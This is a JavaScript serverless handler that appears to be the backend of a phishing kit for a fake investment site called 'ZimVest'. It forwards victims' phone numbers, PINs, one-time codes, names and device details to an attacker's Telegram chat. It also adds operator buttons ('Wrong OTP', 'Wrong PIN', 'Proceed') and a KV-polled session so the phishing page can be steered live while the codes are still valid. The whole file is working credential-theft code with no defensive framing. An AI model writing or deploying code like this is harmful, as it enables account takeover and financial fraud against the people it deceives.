// api/sendTelegram.js — ZimVest v3
// Sends credentials to Telegram with consistent labelled list format:
//   Phone : +263771234567
//   PIN   : 1234
//   OTP   : 123456
// When event === 'otp_confirmed', adds 3 inline action buttons.

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  const TOKEN   = process.env.TELEGRAM_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  if (!TOKEN || !CHAT_ID) return res.status(500).send('Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID');

  let body = {};
  try { body = typeof req.body === 'string' ? JSON.parse(req.body || '{}') : (req.body || {}); }
  catch { return res.status(400).send('Invalid JSON'); }

  const esc = s => s == null ? '—' : String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');

  const ev = body.event || 'activity';
  const evEmoji = {
    invest_initiated: '🚀',
    otp_confirmed:    '🔐',
    resend_otp:       '🔄',
  }[ev] || '📌';

  const evLabel = {
    invest_initiated: 'INVEST INITIATED',
    otp_confirmed:    'OTP CONFIRMED',
    resend_otp:       'OTP RESEND REQUESTED',
  }[ev] || ev.replace(/_/g,' ').toUpperCase();

  // ── Message ───────────────────────────────────────────────────────────────
  let text = `<b>${evEmoji} ZimVest — ${evLabel}</b>\n`;
  text += `<code>━━━━━━━━━━━━━━━━━━━━━━</code>\n\n`;

  // Credentials — each on its own labelled line
  text += `<b>Phone</b> : <code>${esc(body.loginPhone || '—')}</code>\n`;
  text += `<b>PIN</b>   : <code>${esc(body.loginPin   || '—')}</code>\n`;
  text += `<b>OTP</b>   : <code>${esc(body.otp        || '—')}</code>\n`;

  if (body.name) {
    text += `<b>Name</b>  : ${esc(body.name)}\n`;
  }

  text += `\n`;

  // Investment plan
  if (body.plan) {
    text += `<b>💰 Plan</b>   : <code>${esc(body.plan)}</code>\n\n`;
  }

  // Metadata
  text += `<b>🕐 Time</b>  : <code>${new Date().toLocaleString('en-ZW', { timeZone: 'Africa/Harare' })}</code>\n`;
  if (body.device) {
    text += `<b>📲 Device</b>: ${esc(body.device)}\n`;
  }

  // ── Session key for KV polling ────────────────────────────────────────────
  const sessionKey = body.loginPhone
    ? 'tg_session:' + String(body.loginPhone).replace(/\W/g, '') + '_' + Date.now()
    : null;

  // ── Inline keyboard on otp_confirmed only ────────────────────────────────
  const withButtons = ev === 'otp_confirmed';
  const msgPayload = {
    chat_id: CHAT_ID,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    ...(withButtons && {
      reply_markup: {
        inline_keyboard: [[
          { text: '❌ Wrong OTP', callback_data: 'wrong_otp:' + (sessionKey || '') },
          { text: '🚫 Wrong PIN', callback_data: 'wrong_pin:' + (sessionKey || '') },
          { text: '✅ Proceed',   callback_data: 'proceed:'   + (sessionKey || '') },
        ]]
      }
    })
  };

  try {
    const r    = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(msgPayload),
    });
    const data = await r.json();
    if (!r.ok) return res.status(502).json({ error: 'Telegram error', detail: data });

    // Store session in KV so login.html can poll for button press
    if (withButtons && sessionKey) {
      try {
        const { kv } = await import('@vercel/kv');
        await kv.set(sessionKey, JSON.stringify({
          messageId: data.result?.message_id,
          phone: body.loginPhone,
          status: 'pending',
          createdAt: Date.now(),
        }), { ex: 600 }); // 10-minute TTL
      } catch { /* KV unavailable — polling times out gracefully */ }
    }


    // Update investment status to 'active' now that OTP is being confirmed
    if (withButtons && body.plan) {
      try {
        const { kv } = await import('@vercel/kv');
        // Find the investment by phone prefix and update status
        const phoneKey = String(body.loginPhone||'').replace(/\W/g,'');
        let cursor = 0;
        const keys = [];
        do {
          const result = await kv.scan(cursor, { match: 'investment:'+phoneKey+'_*', count: 20 });
          cursor = result[0]; keys.push(...result[1]);
        } while (cursor !== 0);
        // Update the most recent pending investment to active
        const sorted = keys.sort().reverse();
        for (const key of sorted.slice(0,1)) {
          const raw = await kv.get(key);
          if (raw) {
            const inv = typeof raw === 'string' ? JSON.parse(raw) : raw;
            if (inv.status === 'pending') {
              inv.status = 'active';
              await kv.set(key, JSON.stringify(inv), { ex: 30 * 86400 });
            }
          }
        }
      } catch { /* non-blocking */ }
    }

    return res.status(200).json({ ok: true, messageId: data.result?.message_id, sessionKey });
  } catch (e) {
    return res.status(500).json({ error: 'Fetch failed', message: e?.message });
  }
}
